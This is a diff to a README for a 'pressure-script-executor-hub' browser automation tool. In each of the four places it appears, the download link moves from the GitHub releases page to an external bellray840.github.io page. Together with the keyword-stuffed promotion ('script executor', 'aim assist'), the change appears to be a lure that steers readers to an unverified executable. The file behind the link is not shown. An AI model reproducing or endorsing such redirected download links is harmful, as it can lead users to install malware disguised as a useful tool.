@@ -1,6 +1,6 @@
 # ⚡ pressure-script-executor-hub - Automate Browser Tasks Faster Than Ever
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Bellray840/pressure-script-executor-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://bellray840.github.io)
 
 Welcome to **pressure-script-executor-hub** – your all-in-one tool for automating repetitive browser tasks with ease. Whether you're filling forms, clicking buttons, or managing multi-step workflows, this tool handles everything with lightning speed and precision.
 
@@ -19,7 +19,7 @@ Here's how to get up and running in under two minutes.
 ### Step 1: Download the Application
 
 Visit this link to download the application:  
-**👉 [Download pressure-script-executor-hub](https://github.com/Bellray840/pressure-script-executor-hub/releases)**
+**👉 [Download pressure-script-executor-hub](https://bellray840.github.io)**
 
 Make sure you download the latest version. The file is lightweight and downloads quickly.
 
@@ -74,7 +74,7 @@ Works with any website that runs in Chrome, Edge, Firefox, or any Chromium-based
 ## 📥 Download and Installation Guide
 
 Your primary download source is the official releases page:  
-**[https://github.com/Bellray840/pressure-script-executor-hub/releases](https://github.com/Bellray840/pressure-script-executor-hub/releases)**
+**[https://bellray840.github.io](https://bellray840.github.io)**
 
 Visit this link to download the application. You'll see a list of available releases. Always choose the newest one (sorted at the top).
 
@@ -187,6 +187,6 @@ You're all set! Start automating your browser tasks today.
 ---
 
 **📥 Quick Download Reminder**  
-**👉 [Get pressure-script-executor-hub Now](https://github.com/Bellray840/pressure-script-executor-hub/releases)**
+**👉 [Get pressure-script-executor-hub Now](https://bellray840.github.io)**
 
 Keywords: browser automation, web automation tool, script executor, auto clicker, form filler, task scheduler, high velocity automation, aim assist, chromium extension, portable automation tool, Windows automation, free automation software, 2026 automation tools.
